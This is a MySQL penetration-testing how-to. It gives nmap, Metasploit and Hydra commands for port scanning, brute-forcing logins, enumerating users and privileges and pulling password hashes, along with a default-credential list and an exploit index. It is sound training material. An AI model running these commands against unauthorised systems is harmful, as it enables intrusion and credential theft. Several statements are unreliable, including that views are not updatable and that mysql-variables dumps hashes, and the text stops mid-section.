*** MySQL DATABASE PENETRATION TESTING (HOW TO) ***

=========================================================================================================
INDEX
=========================================================================================================
01. Reminder (definitions)
02. MySQL Database Penetration Testing - List of attacks
03. How to perform a network TCP port scan to locate an MySQL Database
04. How to perform a brute-force attack to identify valid database credentials (logins & passwords)
05. How to check if a database is prone to known and unpatched vulnerabilities (e.g. obsolete database version, missing security patches)
06. How to log into a MySQL Database using valid credentials
07. How to identify and exploit database and OS privileges escalation vulnerabilities
08. How to dump and crack MySQL password hashes


==========================================================================================================
01. Reminder - definitions
==========================================================================================================
• RDBMS
MySQL is an open-source Relational Database Management System that works on many platforms. 
It provides multi-user access to support many storage engines and is backed by Oracle.

• SCHEMA
In MySQL, physically, a schema is synonymous with a database. 
You can substitute the keyword SCHEMA instead of DATABASE in MySQL SQL syntax, for example using CREATE SCHEMA instead of CREATE DATABASE.
Some other database products draw a distinction e.g. in the Oracle Database product, a schema represents only a part of a database: the tables and other objects owned by a single user.

• TABLES
Tables are the basic unit of data storage in an MySQL Database. Data is stored in rows and columns. 

• VIEWS
Views are virtual tables formed by a query. A view is a dictionary object that you can use until you drop it. Views are not updatable.

• MySQL user
MySQL user accounts are a user name@host combinations.

• ANONYMOUS user
This is where we need to mention the infamous anonymous account. 
An anonymous account is defined as having an empty user name (“”). 
This means that there can be several anonymous accounts : e.g. “”@localhost, “”@”%.domain.com”, “”@”%” etc.

• DEFINER and INVOKER security contexts
+ A stored program or view that executes in definer security context executes with the privileges of the account named by its DEFINER attribute.
  These privileges may be entirely different from those of the invoking user. 
  The invoker must have appropriate privileges to reference the object (for example, EXECUTE to call a stored procedure or SELECT to select from a view), but when the object executes,
  the invoker's privileges are ignored and only the DEFINER account privileges matter. 
  If this account has few privileges, the object is correspondingly limited in the operations it can perform. 
  If the DEFINER account is highly privileged (such as a root account), the object can perform powerful operations no matter who invokes it.
+ A stored routine or view that executes in invoker security context can perform only operations for which the invoker has privileges. 
  The DEFINER attribute can be specified but has no effect for objects that execute in invoker context.

• Table MYSQL.DB
The db table scope columns determine which users can access which databases from which hosts. 
The privilege columns determine the permitted operations. 
A privilege granted at the database level applies to the database and to all objects in the database, such as tables and stored programs.

• Table MYSQL.USER
The user table scope columns determine whether to reject or permit incoming connections. 
For permitted connections, any privileges granted in the user table indicate the user's global privileges. 
This table contains the password hashes. Any privileges granted in this table apply to all databases on the server.

• Table MYSQL.PROCS
The procs_priv table applies to stored routines (procedures and functions). 
A privilege granted at the routine level applies only to a single procedure or function.

• Table MYSQL.PROXIES
The proxies_priv table indicates which users can act as proxies for other users and whether a user can grant the PROXY privilege to other users.
  
• Authentication methods
MySQL users can be authenticated using database accounts, PAM (linux accounts) or native Windows OS services. 
(https://www.mysql.com/products/enterprise/security.html)

==========================================================================================================
02. MySQL Database Penetration Testing - List of attacks
==========================================================================================================

Black-box penetration test (FROM unauthenticated attacker TO authenticated database user)
------------------------------------------------------------------------------------------
• Brute-force attack to identify default or trivial database credentials
• Exploitation of an insecure authentication mechanism/configuration (if enabled i.e. anonymous acount, proxy users)
• SQL injection in a Web application that allows to run unauthorized SQL queries to a MySQL database
• You have compromised a server and you found clear-text MySQL database credentials hardcoded in scripts, configuration files, .bash_history files or application source code. 
• Run an MySQL database remote exploit (0 day or missing patches e.g. cve-2012-2122, cve-2016-6662)
• Man-In-The-Middle attack to eavesdropped clear-text or hashed credentials (e.g. ARP cache poisoning)
• …

Grey-box penetration test (FROM (low privileged) database user TO privileged database user OR database administrator (DBA))
---------------------------------------------------------------------------------------------------------------------------
• Identify and exploit privilege escalation vulnerabilities due to weak permissions and configuration settings:
  > FILE privilege
  > PROCESS privilege
  > CREATE USER privilege
  > SUPER privilege
  > Proxy_user configuration
  > EXECUTE privilege on a insecure MySQL stored procedure with a DEFINER set to admin (or any privileged account)
  > ...
• Identify and exploit privilege escalation vulnerabilities due to missing security patches (e.g. cve-2016-6662)

==========================================================================================================
03. How to perform a network TCP port scan to locate a MySQL Database
==========================================================================================================

pentester@KaliLinux> nmap -Pn -sS -sV -vv -p 3306 IP-address
pentester@KaliLinux> nmap -v -Pn -sS -sV -p 3306 192.168.0.125


==========================================================================================================
04. How to perform a brute-force attack to identify valid database credentials (logins & passwords)
==========================================================================================================

• Common default credentials:
  + root:empty
  + root:password
  + root:mysql
  + root: pass1
  + mysql:mysql
  + test:test
  + user:user
  + guest:guest
  + auditor:Welcome1
  + mysql:mysql


* NMAP - 'mysql-brute' module and 'mysql-empty-password' module (https://nmap.org)
-----------------------------------------------------------------------------------
Performs password guessing against MySQL.
pentester@KaliLinux> nmap -p 3306 --script mysql-brute --script-args userdb=/root/Desktop.lst,passdb=/root/Desktop/pass.lst 192.168.1.216

Checks for MySQL servers with an empty password for root or anonymous.
pentester@KaliLinux> nmap -sV --script=mysql-empty-password 192.168.1.216


* NMAP - 'mysql-enum' module (https://nmap.org)
------------------------------------------------------------------------
Server version 5.x are susceptible to an user enumeration attack due to different messages during login when using old authentication mechanism from versions 4.x and earlier.

Performs valid-user enumeration against MySQL server using a bug.
pentester@KaliLinux> nmap -p 3306 -v -v --script mysql-enum --script-args mysqluser=guest,mysqlpass= 192.168.0.125


* Metasploit - 'mysql_login' module (https://www.metasploit.com)
------------------------------------------------------------------
Performs password guessing against MySQL.

pentester@KaliLinux> msfconsole
	> use auxiliary/scanner/mysql/mysql_login
	> show options
	> set RHOSTS <Target IP>
	> set USER_FILE /root/<your_username_file>
	> set PASS_FILE /root/<your_password_file>
	> exploit


* THC Hydra (available in Kali Linux)
-----------------------------------------
Performs password guessing against MySQL.

pentester@KaliLinux> hydra -L /root/<your_username_file> -P /root/<your_password_file> <IP> mysql


=========================================================================================================================================
05. How to check if a database is prone to known and unpatched vulnerabilities (e.g. obsolete database version, missing security patches)
=========================================================================================================================================

Step 1. Identify the database version (e.g. version disclosed in software banner, service fingerprinting) using various tools such as Nmap or Metasploit discovery modules.
        Obviously if you already have credentials it is better to use them and to log into the database to check its exact version and its patching level.

Step 2. Search on the Internet (e.g. database provider website, www.cvedetails.com) if the version is still supported and not prone to known vulnerabilities.

Step 3. Look for known exploit using various tools and sources such as ExploitDB / SearchSploit, Metasploit, Github, ...

Tools and scripts
=================

* NMAP - 'mysql-info' module
--------------------------------------------------
This module retrieves mysql information such as version, protocol...

pentester@KaliLinux> nmap -p 3306 --script mysql-info 192.168.0.125

	PORT     STATE SERVICE
	3306/tcp open  mysql
	| mysql-info: 
	|   Protocol: 10
	|   Version: 5.0.51a-3ubuntu5
	|   Thread ID: 11
	|   Capabilities flags: 43564
	|   Some Capabilities: SwitchToSSLAfterHandshake, ConnectWithDatabase, Speaks41ProtocolNew, Support41Auth, LongColumnFlag, SupportsTransactions, SupportsCompression
	|   Status: Autocommit
	|_  Salt: .jJs&^+WU(b95;i"hiUN

	
	
*  Metasploit - 'MySQL Server Version Enumeration' module
-----------------------------------------------------------
This module enumerates the version of MySQL servers.

> auxiliary/scanner/mysql/mysql_version
> https://www.rapid7.com/db/modules/auxiliary/scanner/mysql/mysql_version


* Example of a recent critical vulnerability:
------------------------------------------
> CVE-2016-6662 - MySQL Remote Root Code Execution / Privilege Escalation
  Affected MySQL versions (including the latest):
  + MySQL <= 5.7.15
  + MySQL <= 5.6.33
  + MySQL <= 5.5.52

https://legalhackers.com/advisories/MySQL-Exploit-Remote-Root-Code-Execution-Privesc-CVE-2016-6662.html
https://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html


* Searchsploit / ExploitDB
----------------------------
• Look for public exploits in the ExploitDB database using searchsploit.

jeff@kali-Linux:~$ searchsploit mysql
----------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                                               |  Path (/usr/share/exploitdb/)
----------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
<SNIP>
MySQL (Linux) - Database Privilege Escalation                                                                                | exploits/linux/local/23077.pl
MySQL (Linux) - Heap Overrun (PoC)                                                                                           | exploits/linux/dos/23076.pl
MySQL (Linux) - Stack Buffer Overrun (PoC)                                                                                   | exploits/linux/dos/23075.pl
MySQL - 'Stuxnet Technique' Windows Remote System                                                                            | exploits/windows/remote/23083.txt
MySQL - Authentication Bypass                                                                                                | exploits/multiple/remote/19092.py
MySQL - Denial of Service (PoC)                                                                                              | exploits/linux/dos/23078.txt
MySQL - Remote User Enumeration                                                                                              | exploits/multiple/remote/23081.pl
MySQL - yaSSL CertDecoder::GetName Buffer Overflow (Metasploit)                                                              | exploits/linux/remote/16850.rb
MySQL / MariaDB - Geometry Query Denial of Service                                                                           | exploits/linux/dos/38392.txt
MySQL / MariaDB / PerconaDB 5.5.51/5.6.32/5.7.14 - Code Execution / Privilege Escalation                                     | exploits/linux/local/40360.txt
MySQL / MariaDB / PerconaDB 5.5.x/5.6.x/5.7.x - 'mysql' System User Privilege Escalation / Race Condition                    | exploits/linux/local/40678.c
MySQL / MariaDB / PerconaDB 5.5.x/5.6.x/5.7.x - 'root' System User Privilege Escalation                                      | exploits/linux/local/40679.sh
MySQL 3.20.32 a/3.23.34 - Root Operation Symbolic Link File Overwriting                                                      | exploits/unix/local/20718.txt
MySQL 3.20.32/3.22.x/3.23.x - Null Root Password Weak Default Configuration (1)                                              | exploits/linux/remote/21725.c
MySQL 3.20.32/3.22.x/3.23.x - Null Root Password Weak Default Configuration (2)                                              | exploits/linux/remote/21726.c
MySQL 3.22.27/3.22.29/3.23.8 - GRANT Global Password Changing                                                                | exploits/multiple/local/19721.txt
MySQL 3.23.x - 'mysqld' Local Privilege Escalation                                                                           | exploits/linux/local/22340.txt
MySQL 3.23.x/4.0.x - 'COM_CHANGE_USER' Password Length Account                                                               | exploits/unix/remote/22084.c
MySQL 3.23.x/4.0.x - COM_CHANGE_USER Password Memory Corruption                                                              | exploits/unix/remote/22085.txt
MySQL 3.23.x/4.0.x - Password Handler Buffer Overflow                                                                        | exploits/linux/dos/23138.txt
MySQL 3.23.x/4.0.x - Remote Buffer Overflow                                                                                  | exploits/linux/remote/98.c
MySQL 3.x/4.0.x - Weak Password Encryption                                                                                   | exploits/linux/local/22565.c
MySQL 3.x/4.x - ALTER TABLE/RENAME Forces Old Permission Checks                                                              | exploits/linux/remote/24669.txt
MySQL 4.0.17 (Linux) - User-Defined Function (UDF) Dynamic Library (1)                                                       | exploits/linux/local/1181.c
MySQL 4.1.18/5.0.20 - Local/Remote Information Leakage                                                                       | exploits/linux/remote/1742.c
MySQL 4.1/5.0 - Authentication Bypass                                                                                        | exploits/multiple/remote/24250.pl
MySQL 4.1/5.0 - Zero-Length Password Authentication Bypass                                                                   | exploits/multiple/remote/311.pl
MySQL 4.x - CREATE FUNCTION Arbitrary libc Code Execution                                                                    | exploits/multiple/remote/25209.pl
MySQL 4.x - CREATE FUNCTION mysql.func Table Arbitrary Library Injection                                                     | exploits/multiple/remote/25210.php
MySQL 4.x - CREATE Temporary TABLE Symlink Privilege Escalation                                                              | exploits/multiple/remote/25211.c
MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)                                                      | exploits/linux/local/1518.c
MySQL 4.x/5.0 (Windows) - User-Defined Function Command Execution                                                            | exploits/windows/remote/3274.txt
MySQL 4.x/5.x - Server Date_Format Denial of Service                                                                         | exploits/linux/dos/28234.txt
MySQL 4/5 - SUID Routine Miscalculation Arbitrary DML Statement Execution                                                    | exploits/linux/remote/28398.txt
MySQL 4/5/6 - UDF for Command Execution                                                                                      | exploits/linux/local/7856.txt
MySQL 5 - Command Line Client HTML Special Characters HTML Injection                                                         | exploits/linux/remote/32445.txt
MySQL 5.0.18 - Query Logging Bypass                                                                                          | exploits/linux/remote/27326.txt
MySQL 5.0.20 - COM_TABLE_DUMP Memory Leak/Remote Buffer Overflow                                                             | exploits/linux/remote/1741.c
MySQL 5.0.45 - 'Alter' Denial of Service                                                                                     | exploits/multiple/dos/4615.txt
MySQL 5.0.45 - (Authenticated) COM_CREATE_DB Format String (PoC)                                                             | exploits/multiple/dos/9085.txt
MySQL 5.0.75 - 'sql_parse.cc' Multiple Format String Vulnerabilities                                                         | exploits/linux/dos/33077.c
MySQL 5.0.x - IF Query Handling Remote Denial of Service                                                                     | exploits/linux/dos/30020.txt
MySQL 5.0.x - Single Row SubSelect Remote Denial of Service                                                                  | exploits/linux/dos/29724.txt
MySQL 5.1.13 - INFORMATION_SCHEMA Remote Denial of Service                                                                   | exploits/linux/dos/31444.txt
MySQL 5.1.23 - Server InnoDB CONVERT_SEARCH_MODE_TO_INNOBASE Function Denial of Service                                      | exploits/linux/dos/30744.txt
MySQL 5.1.48 - 'EXPLAIN' Denial of Service                                                                                   | exploits/linux/dos/34506.txt
MySQL 5.1.48 - 'Temporary InnoDB' Tables Denial of Service                                                                   | exploits/php/dos/34505.txt
MySQL 5.1/5.5 (Windows) - 'MySQLJackpot' Remote Command Execution                                                            | exploits/windows/remote/23073.txt
MySQL 5.5.45 (x64) - Local Credentials Disclosure                                                                            | exploits/windows_x86-64/local/40337.py
MySQL 5.5.45 - procedure analyse Function Denial of Service                                                                  | exploits/multiple/dos/39867.py
MySQL 5.5.8 - Remote Denial of Service                                                                                       | exploits/windows/dos/18269.py
MySQL 6.0 yaSSL 1.7.5 - Hello Message Buffer Overflow (Metasploit)                                                           | exploits/linux/remote/9953.rb
MySQL 6.0.4 - Empty Binary String Literal Remote Denial of Service                                                           | exploits/linux/dos/32348.txt
MySQL 6.0.9 - 'GeomFromWKB()' Function First Argument Geometry Value Handling Denial of Service                              | exploits/linux/dos/33398.txt
MySQL 6.0.9 - SELECT Statement WHERE Clause Sub-query Denial of Service                                                      | exploits/linux/dos/33397.txt
MySQL 6.0.9 - XPath Expression Remote Denial of Service                                                                      | exploits/linux/dos/32838.txt
MySQL < 5.6.35 / < 5.7.17 - Integer Overflow                                                                                 | exploits/multiple/dos/41954.py
MySQL AB Eventum 1.x - 'get_jsrs_data.php?F' Cross-Site Scripting                                                            | exploits/php/webapps/26058.txt
MySQL AB Eventum 1.x - 'list.php?release' Cross-Site Scripting                                                               | exploits/php/webapps/26057.txt
MySQL AB Eventum 1.x - 'view.php?id' Cross-Site Scripting                                                                    | exploits/php/webapps/26056.txt
MySQL AB ODBC Driver 3.51 - Plain Text Password                                                                              | exploits/windows/local/22946.txt
MySQL Blob Uploader 1.7 - 'download.php' SQL Injection / Cross-Site Scripting                                                | exploits/php/webapps/44709.txt
MySQL Blob Uploader 1.7 - 'home-file-edit.php' SQL Injection / Cross-Site Scripting                                          | exploits/php/webapps/44710.txt
MySQL Blob Uploader 1.7 - 'home-filet-edit.php' SQL Injection                                                                | exploits/php/webapps/44712.txt
MySQL Blob Uploader 1.7 - 'home-filet-edit.php' SQL Injection / Cross-Site Scripting                                         | exploits/php/webapps/44711.txt
MySQL Commander 2.7 - 'home' Remote File Inclusion                                                                           | exploits/php/webapps/3468.txt
MySQL Edit Table 1.0 - 'id' SQL Injection                                                                                    | exploits/php/webapps/45639.txt
MySQL Eventum 1.5.5 - 'login.php' SQL Injection                                                                              | exploits/php/webapps/1134.pl
MySQL File Uploader 1.0 - 'id' SQL Injection                                                                                 | exploits/php/webapps/41267.txt
MySQL MaxDB 7.5 - WAHTTP Server Remote Denial of Service                                                                     | exploits/multiple/dos/24805.txt
MySQL MaxDB Webtool 7.5.00.23 - Remote Stack Overflow                                                                        | exploits/windows/remote/960.c
MySQL Quick Admin 1.5.5 - 'cookie' Local File Inclusion                                                                      | exploits/php/webapps/6641.txt
MySQL Quick Admin 1.5.5 - Local File Inclusion                                                                               | exploits/php/webapps/7020.txt
MySQL Server 4/5 - Str_To_Date Remote Denial of Service                                                                      | exploits/linux/dos/28026.txt
MySQL Smart Reports 1.0 - 'id' SQL Injection / Cross-Site Scripting                                                          | exploits/php/webapps/44708.txt
MySQL Squid Access Report 2.1.4 - HTML Injection                                                                             | exploits/php/webapps/20055.txt
MySQL Squid Access Report 2.1.4 - SQL Injection / Cross-Site Scripting                                                       | exploits/php/webapps/44483.txt
MySQL User-Defined (Linux) (x32/x86_64) - 'sys_exec' Local Privilege Escalation                                              | exploits/linux/local/46249.py
MySQL yaSSL (Linux) - SSL Hello Message Buffer Overflow (Metasploit)                                                         | exploits/linux/remote/16849.rb
MySQL yaSSL (Windows) - SSL Hello Message Buffer Overflow (Metasploit)                                                       | exploits/windows/remote/16701.rb
MySQLDriverCS 4.0.1 - SQL Injection                                                                                          | exploits/multiple/remote/35892.txt
Mysql 3.22.x/3.23.x - Local Buffer Overflow                                                                                  | exploits/linux/local/20581.c
OraclMySQL 5.1.48 - 'LOAD DATA INFILE' Denial of Service                                                                     | exploits/linux/dos/34510.txt
Oracle MySQL (Windows) - FILE Privilege Abuse (Metasploit)                                                                   | exploits/windows/remote/35777.rb
Oracle MySQL (Windows) - MOF Execution (Metasploit)                                                                          | exploits/windows/remote/23179.rb
Oracle MySQL - 'ALTER DATABASE' Remote Denial of Service                                                                     | exploits/multiple/dos/14537.txt
Oracle MySQL / MariaDB - Insecure Salt Generation Security Bypass                                                            | exploits/linux/remote/38109.pl
Oracle MySQL 5.1.48 - 'HANDLER' Interface Denial of Service                                                                  | exploits/linux/dos/34520.txt
Oracle MySQL < 5.1.49 - 'DDL' Statements Denial of Service                                                                   | exploits/linux/dos/34522.txt
Oracle MySQL < 5.1.49 - 'WITH ROLLUP' Denial of Service                                                                      | exploits/multiple/dos/15467.txt
Oracle MySQL < 5.1.49 - Malformed 'BINLOG' Arguments Denial of Service                                                       | exploits/linux/dos/34521.txt
Oracle MySQL < 5.1.50 - Privilege Escalation                                                                                 | exploits/multiple/remote/34796.txt
Oracle MySQL for Microsoft Windows - Payload Execution (Metasploit)                                                          | exploits/windows/remote/16957.rb
<SNIP>


==========================================================================================================
06. How to log into a MySQL Database using valid credentials
==========================================================================================================

* MySQL client
--------------------------------------------------

LINUX
	pentester@KaliLinux> mysqladmin -h 192.168.1.11 -u root -p
	pentester@KaliLinux> mysql -h 192.168.1.11 -u root -p  db_name
                <enter password>    
		mysql> SHOW DATABASES;
		mysql> status;

WINDOWS
	C:\> cd C:\Program Files\MySQL..\bin
	C:\> mysql.exe   -h 192.168.1.11 -u root -p  db_name 
                <enter password>    
		mysql> SHOW DATABASES;
		mysql> status;


shell> mysql db_name < script.sql > output.tab
shell> ln -s /dev/null $HOME/.mysql_history


* DbVisualizer (GUI multi-database client; https://dbvis.com)
--------------------------------------------------------------
pentester@LinuxVM > sudo find / -name dbvis
		/root/DbVisualizer/wrapper/classes/com/onseven/dbvis
		/root/DbVisualizer/dbvis
		/usr/local/bin/dbvis

pentester@LinuxVM > sudo su
root@LinuxVM > cd /root/DbVisualizer/
root@LinuxVM > ./dbvis

On the GUI
> Go to "TOOLS"
> Go to "New Connection Wizard"
> Enter "MySQL pentest training"
> Select Database Connector for MySQL
> Enter all the right info
> "Ping Server"
> "Connect"



*  NMAP - 'mysql-query' module (https://nmap.org)
--------------------------------------------------
Perform MySQL queries.

pentester@KaliLinux> nmap -p 3306 192.168.0.125 --script mysql-query --script-args -query=show databases,username=root,password=
pentester@KaliLinux> nmap -p 3306 192.168.0.125 --script mysql-query --script-args='query="select @@version;"[,username=root,password=]'
pentester@KaliLinux> nmap -p 3306 192.168.0.125 --script mysql-query --script-args='query="SELECT * FROM table_name WHERE (userID LIKE '%ELM%');"[,username=root,password=]'


* Metasploit - 'MySQL SQL Generic Query' module
------------------------------------------------
This module allows for simple SQL statements to be executed against a MySQL instance given the appropriate credentials.

> auxiliary/admin/mysql/mysql_sql
> https://www.rapid7.com/db/modules/auxiliary/admin/mysql/mysql_sql



==========================================================================================================
07. How to identify and exploit database and OS privileges escalation vulnerabilities
==========================================================================================================


07.1. Check for various useful information (i.e. list of users, DB password policy, who is DBA...) 
==========================================================================================================


* Manual checks:
-----------------------------------------------------------------------
mysql> SELECT user();					//Display current user
mysql> SELECT system_user();				//Display current user
mysql> SELECT @@version;				//Display the DB version
mysql> SELECT @@hostname;				//Display the Hostname and IP Address
mysql> SELECT @@datadir;				//Location of DB files	
mysql> SELECT user FROM mysql.user;			//List Users	
mysql> SELECT host, user, password FROM mysql.user;	//List Password Hashes
mysql> show databases;					//List the databases
mysql> use [databases_name]				//Select a database to use
mysql> show tables [databases_name]			//List the tables of a database
mysql> exit
mysql> SELECT host, user FROM mysql.user WHERE Super_priv = 'Y'; 															 	//List DBA Accounts	
mysql> SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE privilege_type = 'SUPER';	 	//List DBA Accounts	
mysql> SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE privilege_type = 'FILE'; 	 	//List Accounts with FILE privilege
mysql> SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE privilege_type = 'PROCESS'; 	//List Accounts with PROCESS privilege
mysql> SHOW PROCEDURE STATUS;				//List stored procedures and their DEFINER
mysql> SHOW PROCEDURE CODE proc_name
mysql> select * from mysql.proc;

Other useful commands...
mysql> CREATE DATABASE myapp;																									//Create a database
mysql> CREATE USER 'auditor'@'%' IDENTIFIED BY 'Welcome1';																		//Create a user
mysql> SET PASSWORD FOR 'mysql'@'%' = PASSWORD('mysql');																		//Change a user's password
mysql> GRANT SELECT, INSERT, UPDATE, DELETE, CREATE, DROP, ALTER, CREATE TEMPORARY TABLES ON `myapp`.* TO 'myapp'@'localhost';	//Grant privileges to users
mysql> FLUSH PRIVILEGES;																										//Reload the grant tables to apply GRANT changes
mysql> mysqldump -u root -p[root_password] [database_name] > dumpfilename.sql													//Backup a database / 'Dump' a database content
mysql> mysqldump -u root -p[root_password] --all-databases > /tmp/all-database.sql												//Backup all databases
mysql> mysql -u root -p[root_password] [database_name] < dumpfilename.sql														//Restore a database



Incoming connections in the USER table entries
-----------------------------------------------------------------------
Host value			User value	Connections matched by entry
----------------------------------------------------------------------
'SRV01.company'			'db-user'	db-user, connecting from SRV01.company
'SRV01.company'			"		any user, connecting from company
'%'				'db-user'	db-user, connecting from any host
'%'				"		any user, connecting from any host
'%.company'			'db-user'	db-user, connecting from any host in the 'company' domain
'192.168.1.10'			'db-user'	db-user, connecting from the host with IP address 192.168.1.10
'192.168.1.%'			'db-user'	db-user, connecting from any host in the 192.168.1.% class C subnet



* List of sensitive/dangerous SYSTEM privileges:
===================================================
• SUPER privilege 	The SUPER privilege enables an account to use CHANGE MASTER TO, KILL or mysqladmin kill to kill threads belonging to other accounts, PURGE BINARY LOGS,
			configuration changes using SET GLOBAL to modify global system variables, the mysqladmin debug command, enabling or disabling logging, performing updates even
			if the read_only system variable is enabled, starting and stopping replication on slave servers, specification of any account in the DEFINER attribute of stored
			programs and views, and enables you to connect (once) even if the connection limit controlled by the max_connections system variable is reached.
			Enables setting the effective authorization ID when executing a view or stored program. 
			A user with this privilege can specify any account in the DEFINER attribute of a view or stored program.

• FILE privilege 	The FILE privilege gives you permission to read and write files on the server host using the 'LOAD DATA INFILE' and 'SELECT ... INTO OUTFILE'
			statements and the 'LOAD_FILE()' function.
			A user who has the FILE privilege can read any file on the server host that is either world-readable or readable by the MySQL server. 
			(This implies the user can read any file in any database directory, because the server can access any of those files.)

• PROCESS privilege 	The PROCESS privilege can be used to view the plain text of currently executing queries, including queries that set or change passwords.
			The output of 'mysqladmin processlist' shows the text of the currently executing queries.
			Any user who is allowed to execute that command might be able to see if another user issues an 'UPDATE user SET password=PASSWORD('not_secure')' query.

• GRANT privilege	The GRANT OPTION privilege enables you to give to other users or remove from other users those privileges that you yourself possess. 
			The GRANT OPTION privilege enables users to give their privileges to other users. 
			Two users that have different privileges and with the GRANT OPTION privilege are able to combine privileges.

• CREATE USER privilege	The CREATE USER privilege enables use of the ALTER USER, CREATE USER, DROP USER, RENAME USER, and REVOKE ALL PRIVILEGES statements.

• PROXY privilege	The PROXY privilege enables a user to impersonate or become known as another user. 


* NMAP - 'mysql-audit' module (https://nmap.org)
--------------------------------------------------
Audits MySQL database server security configuration against parts of the CIS MySQL v1.0.2 benchmark 
(the engine can be used for other MySQL audits by creating appropriate audit files).

> map -p 3306 --script mysql-audit --script-args "mysql-audit.username='root', mysql-audit.password='',mysql-audit.filename='nselib/data/mysql-cis.audit'" 192.168.1.183

		PORT     STATE SERVICE
		3306/tcp open  mysql
		| mysql-audit: 
		|   CIS MySQL Benchmarks v1.0.2
		|       3.1: Skip symbolic links => FAIL
		|       3.2: Logs not on system partition => PASS
		|       3.2: Logs not on database partition => PASS
		|       4.1: Supported version of MySQL => REVIEW
		|         Version: 5.0.51a-3ubuntu5
		|       4.4: Remove test database => PASS
		|       4.5: Change admin account name => PASS
		|       4.7: Verify Secure Password Hashes => PASS
		|       4.9: Wildcards in user hostname => PASS
		|         The following users were found with wildcards in hostname
		|           guest
		|           root
		|       4.10: No blank passwords => PASS
		|         The following users were found having blank/empty passwords
		|           debian-sys-maint
		|           root
		|           guest
		|       4.11: Anonymous account => PASS
		|       5.1: Access to mysql database => REVIEW
		|         Verify the following users that have access to the MySQL database
		|           user  host
		|       5.2: Do not grant FILE privileges to non Admin users => PASS
		|         The following users were found having the FILE privilege
		|           guest
		|       5.3: Do not grant PROCESS privileges to non Admin users => PASS
		|         The following users were found having the PROCESS privilege
		|           guest
		|       5.4: Do not grant SUPER privileges to non Admin users => PASS
		|         The following users were found having the SUPER privilege
		|           guest
		|       5.5: Do not grant SHUTDOWN privileges to non Admin users => PASS
		|         The following users were found having the SHUTDOWN privilege
		|           guest
		|       5.6: Do not grant CREATE USER privileges to non Admin users => PASS
		|         The following users were found having the CREATE USER privilege
		|           guest
		|       5.7: Do not grant RELOAD privileges to non Admin users => PASS
		|         The following users were found having the RELOAD privilege
		|           guest
		|       5.8: Do not grant GRANT privileges to non Admin users => PASS
		|         The following users were found having the GRANT privilege
		|           guest
		|       6.2: Disable Load data local => FAIL
		|       6.3: Disable old password hashing => FAIL
		|       6.4: Safe show database => FAIL
		|       6.5: Secure auth => FAIL
		|       6.6: Grant tables => FAIL
		|       6.7: Skip merge => FAIL
		|       6.8: Skip networking => FAIL
		|       6.9: Safe user create => FAIL
		|       6.10: Skip symbolic links => FAIL
		|     Additional information
		|       The audit was performed using the db-account: root
		|_      The following admin accounts were excluded from the audit: root,debian-sys-maint


* NMAP - 'mysql-users' module
--------------------------------------------------
Retrieve mysql user names

pentester@KaliLinux> nmap -p 3306 --script mysql-users --script-args mysqluser=root,mysqlpass= 192.168.0.125

		PORT     STATE SERVICE
		3306/tcp open  mysql
		| mysql-users: 
		|   debian-sys-maint
		|   guest
		|_  root


* NMAP - 'mysql-databases' module (https://nmap.org)
-----------------------------------------------------
Attempts to list all databases on a MySQL server.

pentester@KaliLinux> nmap -p 3306 --script mysql-databases --script-args mysqluser=root,mysqlpass= 192.168.0.125

		PORT     STATE SERVICE
		3306/tcp open  mysql
		| mysql-databases: 
		|   information_schema
		|   dvwa
		|   metasploit
		|   mysql
		|   owasp10
		|   tikiwiki
		|_  tikiwiki195

* Nmap - 'mysql-variables' module (https://nmap.org)
-----------------------------------------------------
This command will Dumps the password hashes from a MySQL server in a format suitable for cracking by tools such as John the Ripper.

pentester@KaliLinux> nmap -p 3306 --script=mysql-variables 192.168.0.125 --script-args mysqluser=root,mysqlpass=

		PORT     STATE SERVICE
		3306/tcp open  mysql
		| mysql-variables: 
		|   auto_increment_increment: 1
		|   auto_increment_offset: 1
		|   automatic_sp_privileges: ON
		|   back_log: 50
		|   basedir: /usr/
		|   binlog_cache_size: 32768
		|   bulk_insert_buffer_size: 8388608
		|   character_sets_dir: /usr/share/mysql/charsets/
		|   completion_type: 0
		|   concurrent_insert: 1
		|   connect_timeout: 5
		|   datadir: /var/lib/mysql/
		|   keep_files_on_create: OFF
		|   engine_condition_pushdown: OFF
		|   expire_logs_days: 10
		|   flush: OFF
		|   flush_time: 0
		|   ft_boolean_syntax: + -><()~*:""&|
		|   ft_max_word_len: 84
		|   ft_min_word_len: 4
		|   ft_query_expansion_limit: 20
		|   ft_stopword_file: (built-in)
		|   group_concat_max_len: 1024
		|   have_archive: YES
		|   have_bdb: NO
		|   have_blackhole_engine: YES
		|   have_compress: YES
		|   have_crypt: YES
		|   have_csv: YES
		|   have_dynamic_loading: YES
		|   have_example_engine: NO
		|   have_federated_engine: YES
		|   have_geometry: YES
		|   have_innodb: YES
		|   have_isam: NO
		|   have_merge_engine: YES
		|   have_ndbcluster: DISABLED
		|   have_openssl: YES
		|   have_ssl: YES
		|   have_query_cache: YES
		|   have_raid: NO
		|   have_rtree_keys: YES
		|   have_symlink: YES
		|   hostname: metasploitable
		|   init_connect: 
		|   innodb_lock_wait_timeout: 50
		|   innodb_locks_unsafe_for_binlog: OFF
		|   innodb_log_arch_dir: 
		|   innodb_log_archive: OFF
		|   innodb_log_buffer_size: 1048576
		|   innodb_log_file_size: 5242880
		|   innodb_log_files_in_group: 2
		|   innodb_log_group_home_dir: ./
		|   innodb_thread_sleep_delay: 10000
		|   interactive_timeout: 28800
		|   join_buffer_size: 131072
		|   language: /usr/share/mysql/english/
		|   large_files_support: ON
		|   local_infile: ON
		|   locked_in_memory: OFF
		|   log: OFF
		|   log_bin: OFF
		|   log_bin_trust_function_creators: OFF
		|   log_error: 
		|   log_queries_not_using_indexes: OFF
		|   log_slave_updates: OFF
		|   log_slow_queries: OFF
		|   log_warnings: 1
		|   long_query_time: 10
		|   open_files_limit: 1024
		|   range_alloc_block_size: 2048
		|   read_buffer_size: 131072
		|   read_only: OFF
		|   rpl_recovery_rank: 0
		|   secure_auth: OFF
		|   secure_file_priv: 
		|   server_id: 0
		|   skip_external_locking: ON
		|   skip_networking: OFF
		|   skip_show_database: OFF
		|   slow_launch_time: 2
		|   socket: /var/run/mysqld/mysqld.sock
		|   sort_buffer_size: 2097144
		|   sql_big_selects: ON
